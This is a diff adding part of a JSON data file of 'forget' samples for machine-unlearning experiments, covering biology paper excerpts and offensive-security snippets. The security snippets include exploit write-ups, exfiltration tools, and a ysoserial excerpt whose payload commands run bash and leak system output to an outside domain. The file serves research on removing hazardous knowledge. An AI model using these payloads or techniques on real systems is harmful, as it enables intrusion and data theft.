+          "text": "There are 19.82 billion cubic metres of proven reserves of gas.",
+          "char_len": 63,
+          "source_index": 32
+        },
+        {
+          "text": "An alternative metric, known as modified gross national income (GNI), was created by the Central Statistics Office and is used by the Irish government to give a view of activity in the domestic economy after stripping out large multinational export movements which can often relate to intangible assets.",
+          "char_len": 303,
+          "source_index": 250
+        },
+        {
+          "text": "In March 2016 the unemployment rate was reported by the CSO to be 8.6%, down from a peak unemployment rate of 15.1% in February 2012.",
+          "char_len": 133,
+          "source_index": 192
+        },
+        {
+          "text": "Ireland has also produced many internationally known artists in other genres, such as rock, pop, jazz, and blues.",
+          "char_len": 113,
+          "source_index": 120
+        },
+        {
+          "text": "This rate declined somewhat during the subsequent 2006–2011 intercensal period, with an average annual percentage change of 1.6%.",
+          "char_len": 129,
+          "source_index": 19
+        },
+        {
+          "text": "Following in the tradition of acclaimed practitioners, principally Oscar Wilde, Literature Nobel Prize laureates George Bernard Shaw (1925) and Samuel Beckett (1969), playwrights such as Seán O'Casey, Brian Friel, Sebastian Barry, Brendan Behan, Conor McPherson and Billy Roche have gained popular success.",
+          "char_len": 306,
+          "source_index": 225
+        },
+        {
+          "text": "Membership declined throughout the twentieth century but experienced an increase early in the 21st century alongside other Christian denominations.",
+          "char_len": 147,
+          "source_index": 24
+        },
+        {
+          "text": "With the erection of buildings such as The Custom House, Four Courts, General Post Office and King's Inns, the neoclassical and Georgian styles flourished, especially in Dublin.",
+          "char_len": 177,
+          "source_index": 295
+        },
+        {
+          "text": "This is a \"response to the partitionist view [...] that Ireland stops at the border\".",
+          "char_len": 85,
+          "source_index": 103
+        },
+        {
+          "text": "The Church of Ireland, at 2.7% of the population, is the second largest Christian denomination.",
+          "char_len": 95,
+          "source_index": 220
+        },
+        {
+          "text": "Georgian townhouses produced streets of singular distinction, particularly in Dublin, Limerick and Cork.",
+          "char_len": 104,
+          "source_index": 205
+        }
+      ]
+    },
+    {
+      "concept": "wmdp-bio",
+      "n_forget_raw": 300,
+      "n_forget_raw_unique": 300,
+      "n_forget_rmu_filtered": 300,
+      "n_forget_crisp": 300,
+      "rmu_usage": {
+        "google/gemma-2-2b-it": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "Qwen/Qwen3.5-2B": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 272,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "meta-llama/Llama-3.1-8B-Instruct": {
+          "batch_size": 8,
+          "n_batches": 33,
+          "n_forget_used": 264,
+          "n_forget_used_unique": 264,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        }
+      },
+      "forget": [
+        {
+          "text": "Introduction In September 2009, the World Health Organization (WHO) recommended to include the 2009 pandemic influenza A(H1N1) virus as the H1N1 component of the trivalent, seasonal influenza vaccine for the 2010 influenza season in the southern hemisphere. In February 2010, the same recommendation was made for the 2010/2011 influenza season in the northern hemisphere. This indicates that the world-wide circulation the 2009 pandemic influenza A(H1N1) virus has not yet undergone significant antigenic and genetic changes. This stability may be attributed to the lack of pre-existing immunity in large segments of the global human population. In serosurveys, particularly elderly individuals were found to have pre-existing cross-reactive antibodies to the novel pandemic virus that were likely derived from previous infection with an antigenically related virus such as the Spanish influenza and its immediate descendant viruses that were circulating in the early decades of the 20th century. Con",
+          "char_len": 1000,
+          "source_index": 106
+        },
+        {
+          "text": "Introduction Coronavirus disease 2019 (COVID-19), also known as SARS-CoV-2, appeared in 31 December 2019 in the city of Wuhan, Central China, and has spread quickly to 213 Countries around the world to date. The virus affected more than 38 million people (38.554.552) and caused more than 1 million deaths in the world. SARS-CoV-2 is a large family of viruses that cause malady. Illness in humans is mostly respiratory, while symptoms can range from common cold to those of more severe lower respiratory infections. SARS-CoV-2 can also presents other serious manifestations such fatigue, fever, dry cough, myalgia and dyspnoea, with less common symptoms being nasal congestion, headache, runny nose, sore throat, vomiting and diarrhea. For this reason, many scientists were focused to find a rapid and accurate detection of SARS-CoV-2 in environment and aqueous environment, notably hospital wastewater, in order to control his development and to determine the different ways of his transmission. Hos",
+          "char_len": 1000,
+          "source_index": 239
+        },
+        {
+          "text": "Herpes zoster (HZ) may be a marker of occult cancer and some authors have advocated increased work-up for cancer in patients with HZ. However, limited data are available on whether HZ may be used to predict mortality in patients presenting with subsequent cancer in clinical practice. The two previous studies on the topic overall showed no association, but were limited by small sample sizes and lacked information on key prognostic factors, such as cancer stage and comorbidities. The first study, which was conducted by our research group, was furthermore restricted to in-patient HZ diagnoses. Our objective was to provide updated and more detailed analyses of the association between HZ and mortality following a subsequent cancer by extending the period of follow-up, by including inpatient, outpatient and emergency room HZ diagnoses, and by obtaining information on cancer stage, comorbidities and use of immunosuppressive drugs. Materials and methods We conducted this nationwide matched coh",
+          "char_len": 1000,
+          "source_index": 37
+        },
+        {
+          "text": "1. Introduction Measles virus (MeV) is the etiologic agent of measles, a highly contagious and vaccine-preventable illness. Despite the existence of a safe and effective vaccine, measles remains a major cause of morbidity and mortality globally, especially in young children. This review focuses on the global measles burden and the contribution of current and novel vaccination strategies to reaching the World Health Organization (WHO) measles elimination goals. Relevant background information on the virus and the disease is included to facilitate discussion. MeV is a member of the family Paramyxoviridae, genus Morbillivirus and has a negative-sense, single-stranded RNA genome measuring approximately 15.9 kb. The MeV particle is pleomorphic and is largely cell-associated with a virion size ranging from 50 to 510 nm. In the virus particle, two surface glycoproteins, the fusion (F) and hemagglutinin (H), form a multimeric complex which mediates viral entry. The nucleoprotein (N) encapsidat",
+          "char_len": 1000,
+          "source_index": 89
+        },
+        {
+          "text": "Introduction Antibodies are indispensable tools for basic research, diagnostics and therapy. In the past - and still today- polyclonal antibodies (blood serum) are produced in animals like horses. The hybridoma technology was a milestone in antibody generation because it allowed the production of monoclonal antibodies. Despite these antibodies are monoclonal, cell secreted antibodies are not always monospecific, as unveiled by the results of a multicentric study on the detrimental effects of genetic diversity in individual hybridoma clones. Of 185 randomly selected hybridomas analyzed in this study, almost one third was found to contain additional productive heavy or light chains, resulting in antibodies with reduced affinity and more than one specificity. Other limitations of the hybridoma technology are the possible instability of the tetraploid, but also often aneuploid hybridoma cell lines, the restriction of the immune system which prevents the generation of antibodies against hig",
+          "char_len": 1000,
+          "source_index": 32
+        },
+        {
+          "text": "Background Breast cancer (BC) is the most common cancer among females in Sudan, and is still a leading cause of high morbidity and mortality across the world. According to a recent report from the national cancer registry, BC had an incidence rate of 25.1 per 100.000, more than twice the incidence rate of the second commonest cancer. Furthermore, Sudanese BC patients tend to present at young age, at late stage, and with advanced disease compared to their counterparts in other countries. Another study reported a young age of presentation for locally advanced BC. Therefore, there is an urgent need for serious epidemiologic and molecular studies in order to trace the underlying mechanisms behind BC, and for developing better early detection methods as well as a nationwide educational effort to tackle this ravaging disease. Epigenetics has emerged as a new, rapidly growing field in biology, with significant implications for cancer research. Epigenetic modifications include DNA methylation,",
+          "char_len": 1000,
+          "source_index": 250
+        },
+        {
+          "text": "Introduction Diabetes mellitus (DM) has long been recognised as a serious challenge to health, due to its ability to affect almost every organ in the human body. Diabetes is broadly classified into two subtypes: type 1 (T1DM) and type 2 (T2DM), with differing clinical phenotypes that require distinct therapeutic management. Both forms of diabetes are associated with an increased risk of cardiovascular complications that can have a significant impact on patient morbidity and mortality. Albuminuria is one of the most commonly assessed clinical parameters in diabetic patients. A number of simple dipstick testing methods are available in current practice to measure protein levels in the urine. Albumin is a tightly regulated component in the circulation, with the kidney playing an important role in maintaining albumin homeostasis. The role of albuminuria as a potential driver as well as a biomarker of diabetic complications has been increasingly recognised. Given the potential of albuminuri",
+          "char_len": 1000,
+          "source_index": 192
+        },
+        {
+          "text": "Introduction Varicella, more commonly referred to as chickenpox, is a self-limiting, yet highly contagious disease caused by the varicella zoster virus (VZV) that typically occurs during childhood. Following a 10- to 21-day incubation period, the symptoms of viral infection start to appear, which include a characteristic pruritic vesicular rash, fever, malaise, headache, and/or abdominal pain. At times, complications may emerge and result in secondary bacterial infections, such as skin and soft tissue infections, and pneumonia, or neurologic complications, including cerebellitis, and encephalitis. The care associated with varicella, whether acute or long-term, therefore, puts a significant economic burden on national health systems. Furthermore, in the absence of vaccination, most countries found in the temperate zone demonstrate a pediatric population that is over 90% seropositive for VZV. The use of vaccination to prevent varicella has become an important strategy in reducing the mor",
+          "char_len": 1000,
+          "source_index": 120
+        },
+        {
+          "text": "Introduction After a nearly decade-long, $100 million dollar investigation into the 2001 Amerithrax anthrax attacks, the National Academy of Sciences reported that it is not possible to reach a definitive conclusion about the originsbased solely on the available scientific evidence. In the aftermath of Amerithrax, the scientific community mobilized to develop genetic and phenotypic methods for forensic attribution of biological attacks. However, these efforts were severely constrained by the limits of biotechnology; satisfactory sequencing of the anthrax agents genome would have cost $500,000 dollars at the time. Today, exponential improvement in tools for biotechnology have made this and other life-saving tasks increasingly inexpensive and accessible, yet these advancements have not been matched with corresponding improvements in tools to support responsible innovation in genetic engineering. In particular, attribution is still considered technically challenging and unsolved. Just as",
+          "char_len": 999,
+          "source_index": 19
+        },
+        {
+          "text": "INTRODUCTION Patient-derived tumor xenografts (PDXs) are established by xenotransplantation of surgically resected human cancer specimens into immunodeficient mice, such as a nonobese diabetic/severe combined immunodeficientcy (NOD/SCID) mouse which is deficient in both innate and adaptive immunities, and an NOD/SCID/IL-2rgnull (NSG) mouse which further lacks NK cell activity. PDX tumors are able to mirror patients' histopathological and genetic profiles, can metastasize to distant organs, and are characterized by the presence of a cancer stem cell (CSC) population. Furthermore, PDXs are an attractive preclinical model to investigate therapeutic response, cancer resistance, metastasis and biomarkers. It is reported that the engraftment of human cancer specimens into an immunodeficient mouse unexpectedly resulted in the formation of lymphoma instead of their corresponding cancers, such as lung, liver, gastric, bladder, breast and prostate cancers. The incidence of lymphomagenesis among",
+          "char_len": 999,
+          "source_index": 225
+        },
+        {
+          "text": "The function of Langerhans cells The precise function of Langerhans cells (LCs) in vivo is still not entirely clear. Without doubt, LCs make first contact with many microbes entering the body through the surface of the skin and mucosae. From this, it was inferred that LCs would invariably induce immunity against these pathogens. This assumption was supported by ample in vitro evidence for an immunogenic, T-cell stimulatory function of LCs; however, about 8 years ago, this concept began to be repeatedly challenged with regard to certain viral and parasitic infections (and in other models). For example, LCs in skin-draining lymph nodes cannot present antigen derived from cutaneous herpes simplex virus-1; and vaginal submucosal DCs, but not LCs, induce protective Th1 responses to herpes simplex virus-2. Likewise, during infection with leishmania, parasites are presented by DCs other than LCs in the draining lymph nodes. Complementing these studies, other groups demonstrated that LCs are i",
+          "char_len": 1000,
+          "source_index": 24
+        },
+        {
+          "text": "Introduction Coronavirus disease 2019 (COVID-19), caused by severe acute respiratory syndrome coronavirus 2 (SARS-CoV-2), is a major global crisis. On March 11, 2020, the World Health Organization (WHO) declared COVID-19 a pandemic, and it has become one of the deadliest pandemics in the last century. The burden of COVID-19 extends far beyond that of a contagious disease. COVID-19 affects the entire health system through its direct effect as a communicable disease, as well as its ability to alter the overall mortality and burden of disease through impact on non-communicable diseases. Globally, non-communicable diseases, including cardiovascular disease, accounted for greater than 70% of all deaths in 2017. There is mounting evidence that COVID-19 and non-communicable diseases may be associated on multiple levels, resulting in potentially unexpected effects on health outcomes. On one hand, COVID-19 is associated with cardiovascular diseases, such as acute cardiac injury (e.g. myocarditi",
+          "char_len": 1000,
+          "source_index": 295
+        },
+        {
+          "text": "Introduction Severe acute respiratory syndrome coronavirus 2 (SARS-CoV-2) emerged in December 2019 causing a global pandemic that has resulted in more than 768 million cases and 69 million deaths worldwide as of June 2023. Early in the pandemic, the National Institute of Allergy and Infectious Disease (NIAID) at the US National Institutes of Health (NIH) partnered with multiple pharmaceutical companies to expedite the development of an effective vaccine to prevent the spread of SARS-CoV-2. In addition to this unprecedented publicprivate collaboration, NIAID merged four existing clinical trial networks to form the COVID-19 Prevention Network (CoVPN). The CoVPN, along with the study sites affiliated with contract research organizations (CRO), facilitated the rapid enrollment of the tens of thousands of participants needed for the Phase 3 vaccine safety and efficacy trials. Four SARS-CoV-2 vaccine candidates (mRNA-1273, AZD1222 ChAdOx1 nCoV-19, Ad26.COV2.S, and NVX-CoV2373) have been eval",
+          "char_len": 1000,
+          "source_index": 103
+        },
+        {
+          "text": "Introduction Dietary restriction (DR) induces lifespan extension in yeast, worms, flies, mice and monkeys. Several key signaling pathways and regulators have been identified that partially mediate the effects of DR on aging and lifespan, such as insulin/IGF1 like growth factor signaling pathway, AMPK signaling pathway, TOR signaling pathway and the sirtuin protein family. However, none of these pathways are solely responsible for the DR effect, because blocking any of them individually does not fully block DR induced lifespan extension by all regimens. Thus, although targeting these pathways results in long-lived animals, DR still gives additional benefits. It remains unclear whether different pathways mediate different aspects of DR response, whether they interact with each other in response to DR, or whether they act at different stages of DR. DR is known to induce systemic changes in a whole organism, and is therefore a good paradigm to learn how regulation of aging can be achieved",
+          "char_len": 999,
+          "source_index": 220
+        },
+        {
+          "text": "INTRODUCTION Popular strategies of cancer gene therapy have been to augment suicidal activity by introducing the Herpes simplex virus thymidine kinase (HSVtk) gene through ganciclovir (GCV) treatment or to increase anti-tumor immune response by transfer of some cytokine genes such as IL-2, IL-4, IFN-, and granulocyte-macrophage colony-stimulating factor (GM-CSF). These studies have yielded encouraging results, which have inspired investigators to optimize the combinations of suicide gene with cytokine genes or those of different cytokine genes to increase the anti-tumor effect. The HSVtk converts nucleoside analogues, such as GCV, to monophosphate forms by phosphorylation. These are subsequently modified to toxic triphosphates by endogenous cellular enzymes and incorporated into nascent DNA, which causes chain termination and cell death. With such an alteration of GCV, neighboring cells that do not express the HSVtk gene are killed in addition to the tumor cells expressing the genes. A",
+          "char_len": 1000,
+          "source_index": 205
+        }
+      ]
+    },
+    {
+      "concept": "wmdp-cyber",
+      "n_forget_raw": 300,
+      "n_forget_raw_unique": 241,
+      "n_forget_rmu_filtered": 300,
+      "n_forget_crisp": 300,
+      "rmu_usage": {
+        "google/gemma-2-2b-it": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 218,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "Qwen/Qwen3.5-2B": {
+          "batch_size": 16,
+          "n_batches": 17,
+          "n_forget_used": 272,
+          "n_forget_used_unique": 218,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        },
+        "meta-llama/Llama-3.1-8B-Instruct": {
+          "batch_size": 8,
+          "n_batches": 33,
+          "n_forget_used": 264,
+          "n_forget_used_unique": 213,
+          "n_retain_used": 258,
+          "n_retain_used_unique": 258
+        }
+      },
+      "forget": [
+        {
+          "text": "> $ Zon8 Research * About * Posts 9 minutes Written by 0x4848 JavaScript Engine Fuzzing and Exploitation Reading List [Updated 2022] In The Laymans Guide To Zero-Day Engineering Markus and Amy of Ret2Systems emphasized the importance of building your own library of bookmarks on security and architecture literature on the target you want to exploit. We have always taken this point to heart and have been maintaining our own list of bookmarks for a while now on Trello. Today we are making this list public for everyones reference. Continously Updated! Last Update: 11 November 2022 Want to learn how to break browsers, and in particular JavaScript engines? Traveling and got some reading time? Watch these conference talks or read these articles to get up to speed with browser vulnerability research and exploitation. Videos * Attacking Client Side JIT Compilers - Samuel Gro - Black Hat USA 2018 - This talk explains what are JIT compilers, and what types of bugs can occur in them. Saelo uses hi",
+          "char_len": 1000,
+          "source_index": 106
+        },
+        {
+          "text": "#QRCode-Video-Data-Exfiltration# Exfiltrate data with QR code videos generated from files by HTML5/JS. Data => QR Code Video ## Host the files in the folder labled `file_to_qr` on a web server. Visit the web server. Drag and drop a file into the browser window where it says `Drop files here...`. A video of QR codes should start flashing. Point a cellphone camera or other video capture device at the screen and record. Make sure to record until you have seen the blue flash twice. This will ensure that you have gotten all the data. QR Code Video => Data ## First you need to convert the data to something that opencv will understand. See for information on compatible formats. I have found the following command to do the trick for me: mencoder ./foo.mov -ovc raw -vf format=i420 -nosound -o out.avi Next, you will need to run this video through the processing script. **Remember to provide the full path to the video rather than the relative path**. Blame opencv for this, not me. This should loo",
+          "char_len": 1000,
+          "source_index": 239
+        },
+        {
+          "text": "#Pwning Tech Pwning Tech (BUTTON) (BUTTON) * Home * Infrastructure * About * Twitter * Github (BUTTON) Real World Featured Unleashing ksmbd: remote exploitation of the Linux kernel (ZDI-23-979, ZDI-23-980) * notselwyn Aug 4, 2023 10 min read December 22nd 2022: it's Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of ZDI-22-1690, an unauthenticated RCE vulnerability in the Linux kernel's ksmbd subsystem. This vulnerability showed me the way to a buggy subsystem of the Linux kernel: ksmbd. Ksmbd stands for Kernel SMB Daemon which acts as an SMB server (which you may recognize from Windows) in the kernel. SMB is known in the community for the unnecessary complexity and it's resulting vulnerabilities. Imagine the reaction of the Linux developer community when ksmbd was being",
+          "char_len": 1000,
+          "source_index": 37
+        },
+        {
+          "text": "#Penetration Testing Lab Feed Penetration Testing Lab Comments Feed Penetration Testing Lab PetitPotam NTLM Relay to AD CS Comments Feed alternate alternate Penetration Testing Lab WordPress.com Skip to content Penetration Testing Lab Offensive Techniques & Methodologies (BUTTON) Menu * Methodologies + Red Teaming o Persistence * Resources + Papers o Web Application + Presentations o Defcon o DerbyCon o Tools + Videos o BSides o Defcon o DerbyCon o Hack In Paris * Contact + About Us Posted on September 14, 2021September 21, 2021 PetitPotam NTLM Relay to AD CS by Administrator.In Domain Escalation.8 Comments on PetitPotam NTLM Relay to AD CS Deployment of an Active Directory Certificate Services (AD CS) on a corporate environment could allow system administrators to utilize it for establishing trust between different directory objects. However, it could allow red team operators to conduct an NTLM relay attack towards the web interface of an AD CS in order to compromise the network. The",
+          "char_len": 999,
+          "source_index": 89
+        },
+        {
+          "text": "Module Stomping / Module Overloading / DLL Hollowing A basic/simple PoC in Rust made for fun, practice, and learning. Check out my Manual Mapper in Rust: https://github.com/memN0ps/mmapper-rs or Shellcode Reflective DLL Injection in Rust: https://github.com/memN0ps/srdi-rs for alternatives. Description Module stomping injects a Microsoft-signed DLL (e.g amsi.dll) using a classic DLL Injection technique that uses as shown here: . It will then read the `AddressOfEntryPoint` of the injected DLL from the target process and overwrite the content with shellcode. In this example we use the following steps to perfrom a classic DLL Injection of `amsi.dll` inside `notepad.exe` and then inject our shellcode inside `amsi.dll's` entry point: * `OpenProcess` - Open a handle to the target process with `PROCESS_ALL_ACCESS` * `VirtualAllocEx` - Allocate memory for `amsi.dll` full path * `WriteProcessMemory` - Write the DLL path to the target process memory * `GetModuleHandleA` - Get a handle to `kernel",
+          "char_len": 1000,
+          "source_index": 32
+        },
+        {
+          "text": "Level 3 Vulnerability printf() format string attack Context ``` level3@RainFall:~$ ls -l -rwsr-s---+ 1 level4 users 5366 Mar 6 2016 level3 level3@RainFall:~$ ./level3 hello hello ``` We have a binary that prints input from the stdin. Solution Let's take a look at the binary in gdb. <br/> We can see here that ```level3``` makes a call to ```main()```, which makes a call to a function ```v()```. <br/> ``` (gdb) disas main Dump of assembler code for function main: 0x0804851a <+0>: push %ebp 0x0804851b <+1>: mov %esp,%ebp 0x0804851d <+3>: and $0xfffffff0,%esp 0x08048520 <+6>: call 0x80484a4 <v> 0x08048525 <+11>: leave 0x08048526 <+12>: ret End of assembler dump. ``` Let's take a deeper look a ```v()```.<br/> We can see two function calls in ```v()```. <br/> One is to ```fgets()```, which is protected against buffer overflow attacks. <br/> The other is to ```printf()```, which is vulnerable to string format exploits. ``` (gdb) disas v [...] 0x080484c7 <+35>: call 0x80483a0 <fgets@plt> 0x080",
+          "char_len": 1000,
+          "source_index": 250
+        },
+        {
+          "text": "#GitHub Skip to content (BUTTON) Toggle navigation Sign in (BUTTON) * (BUTTON) Product + Actions Automate any workflow + Packages Host and manage packages + Security Find and fix vulnerabilities + Codespaces Instant dev environments + Copilot Write better code with AI + Code review Manage code changes + Issues Plan and track work + Discussions Collaborate outside of code Explore + All features + Documentation + GitHub Skills + Blog * (BUTTON) Solutions For + Enterprise + Teams + Startups + Education By Solution + CI/CD & Automation + DevOps + DevSecOps Resources + Learning Pathways + White papers, Ebooks, Webinars + Customer Stories + Partners * (BUTTON) Open Source + GitHub Sponsors Fund open source developers + The ReadME Project GitHub community articles Repositories + Topics + Trending + Collections * Pricing (BUTTON) Search or jump to... Search code, repositories, users, issues, pull requests... Search ____________________ Clear (BUTTON) Search syntax tips Provide feedback (BUTTON",
+          "char_len": 1000,
+          "source_index": 4
+        },
+        {
+          "text": "#Penetration Testing Lab Feed Penetration Testing Lab Comments Feed Penetration Testing Lab SMB Share SCF File Attacks Comments Feed alternate alternate Penetration Testing Lab WordPress.com Skip to content Penetration Testing Lab Offensive Techniques & Methodologies (BUTTON) Menu * Methodologies + Red Teaming o Persistence * Resources + Papers o Web Application + Presentations o Defcon o DerbyCon o Tools + Videos o BSides o Defcon o DerbyCon o Hack In Paris * Contact + About Us Posted on December 13, 2017 SMB Share SCF File Attacks by Administrator.In Infrastructure.18 Comments on SMB Share SCF File Attacks SMB is a protocol which is widely used across organisations for file sharing purposes. It is not uncommon during internal penetration tests to discover a file share which contains sensitive information such as plain-text passwords and database connection strings. However even if a file share doesnt contain any data that could be used to connect to other systems but it is configured",
+          "char_len": 1000,
+          "source_index": 120
+        },
+        {
+          "text": "#Penetration Testing Lab Feed Penetration Testing Lab Comments Feed Penetration Testing Lab AppLocker Bypass Regsvr32 Comments Feed alternate alternate Penetration Testing Lab WordPress.com Skip to content Penetration Testing Lab Offensive Techniques & Methodologies (BUTTON) Menu * Methodologies + Red Teaming o Persistence * Resources + Papers o Web Application + Presentations o Defcon o DerbyCon o Tools + Videos o BSides o Defcon o DerbyCon o Hack In Paris * Contact + About Us Posted on May 11, 2017 AppLocker Bypass Regsvr32 by Administrator.In Defense Evasion.7 Comments on AppLocker Bypass Regsvr32 AppLocker was designed to allow administrators to block the execution of Windows installer files, executables and scripts by users. However various techniques have been discovered that can bypass these restrictions. For example in windows environments that are configured to prevent the execution of scripts via AppLocker the regsrv32 command line utility can be used as a bypass method. AppL",
+          "char_len": 1000,
+          "source_index": 19
+        },
+        {
+          "text": "<p align=\"center\"> <img src=\"/images/blue-pigeon-logo.jpg\"> <br /> <b>Blue Pigeon: Bluetooth-based Data Exfiltration and Proxy Tool for Red Teamers</b> </p> 1. 2. 3. 4. 5. Blue Pigeon: Bluetooth-based Data Exfiltration and Proxy Tool for Red Teamers Blue Pigeon is a Bluetooth-based data exfiltration and proxy tool to enable communication between a remote Command and Control (C2) server and a compromised host. Inspired by the 's ability to carry messages back to its home, Blue Pigeon mimics the homing behaviour and delivers messages/payloads between the agent (compromised host) and its nest (mobile application and subsequently proxied to C2 server). Blue Pigeon is developed as an Android application for the Red Teamer to deploy within vicinity of the compromised host and is particularly useful for Red Team operations where communications over traditional channels (i.e., web, e-mail, DNS) are not available. Expanding on the Exfiltration over Alternative Protocol technique (ID: T1048) und",
+          "char_len": 1000,
+          "source_index": 225
+        },
+        {
+          "text": "Java Deserialization Detection - \"AC ED 00 05\" in Hex - \"rO0\" in Base64 - Content-type = \"application/x-java-serialized-object\" - \"H4sIAAAAAAAAAJ\" in gzip(base64) Exploit : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. ```java java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin java -jar ysoserial-master-v0.0.4-g35bce8f-67.jar Groovy1 'ping 127.0.0.1' > payload.bin java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64 ``` payload | author | dependencies | impact (if not RCE) ------|--------|------ |------ BeanShell1 |@pwntester, @cschneider4711 |bsh:2.0b5 C3P0 |@mbechler |c3p0:0.9.5.2, mchange-commons-java:0.2.11 Clojure |@JackOfMostTrades |clojure:1.8.0 CommonsBeanutils1 |@frohoff |commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 CommonsCollections1 |@frohoff |commons-collections:3.1 CommonsCollections",
+          "char_len": 1000,
+          "source_index": 24
+        },
+        {
+          "text": "#BREAKDEV BREAKDEV (BUTTON) * Home * Tools * Contact (BUTTON) Subscribe x86 X86 Shellcode Obfuscation - Part 1 * Kuba Gretzky Kuba Gretzky May 11, 2016 8 min read X86 Shellcode Obfuscation - Part 1 I decided to do research on shellcode obfuscation in order to see how hard it would be to develop a tool that can take any binary x86 shellcode and generate the completely unique version from it. Please note that such tool is most useful in scenarios when shellcode has to be saved on disk (e.g. embedded inside an executable file). Obfuscated shellcodes will greatly increase in size, which may not be a desirable outcome, especially if such is to be embedded inside an exploit payload, where small shellcode size is often the highest priority. Main reason for having a shellcode obfuscator is bypassing any static or run-time signature detections implemented by IDS or AV products. As an example, take Metasploit. Its shellcode payloads have been public for many years and by now most major IDS/AV so",
+          "char_len": 1000,
+          "source_index": 295
+        },
+        {
+          "text": "Welcome Why? Training Games ChangeBlog External Resources Submit Content Exploits 2: Exploitation in the Windows Environment Creator: Corey Kallenberg @CoreyKal License: Creative Commons: Attribution, Share-Alike (http://creativecommons.org/licenses/by-sa/3.0/) Class Prerequisites: Introduction to x86, Exploits 1 Lab Requirements: Windows XP SP3 Virtual Machine with the following installed: Windows Platform SDK 7.0 or 7.1 (optional debugging tools need to be installed) Microsoft Visual C++ express 2008 HXD hex editor Class Textbook: \"The Shellcoder's Handbook: Discovering and Exploiting Security Holes\" (2nd edition) by Chris Anley, John Heasman, Felix Lindner, Gerardo Richarte Class Prereqs: Must have a basic understanding of the C programming language, as this class will show how C code can be exploited. Must have taken Intro x86 and Exploits 1. Some knowledge of the PE header format from Life of Binaries would be useful as well. Recommended Class Duration: 3 days Creator Available to",
+          "char_len": 1000,
+          "source_index": 103
+        },
+        {
+          "text": "#RET2 Systems Blog [logo-full.svg] ENGINEERING BLOG A Methodical Approach to Browser Exploitation The Exploit Development Lifecycle, From A to Z(ero Day) June 5, 2018 / Patrick Biernat, Markus Gaasedelen, Amy Burnett __________________________________________________________________ Pwn2Own is an industry-level security competition organized annually by Trend Micros Zero Day Initiative. Pwn2Own invites top security researchers to showcase zero-day exploits against high-value software targets such as premiere web browsers, operating systems, and virtualization solutions. We were interested in participating for the first time this year, choosing to target Apple Safari on macOS because the software & platform was one that we had not worked with before. For the purpose of this competition, we discovered and exploited two previously unknown vulnerabilities in Apple software to achieve remote code execution as root through a single click in the Safari Web Browser. Joshua Smith from ZDI evalu",
+          "char_len": 1000,
+          "source_index": 220
+        },
+        {
+          "text": "RM to MP3 Converter Exploit to pop _calc.exe_ for RM to MP3 Converter v2.7.3.700 on Windows XP. Note: uses NtSetInformationProcess to defeat DEP. Tested on Windows XP SP3. Related Tutorials: * https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/ How 2 use: 1. Generate the _exploit.m3u_ file by running 2. Wait for the application to load completely 3. Load the _exploit.m3u_ file into the RM to MP3 Converter Example exploit file * https://raw.githubusercontent.com/NtRaiseHardError/Windows-Binary-Exploitation/master/Corelan/Corelan-Tutorials/RM-to-MP3-Converter/DEP-Bypass/NtSetInformationProcess/exploit.m3u",
+          "char_len": 676,
+          "source_index": 205
+        }
+      ]
+    }
+  ]
+}
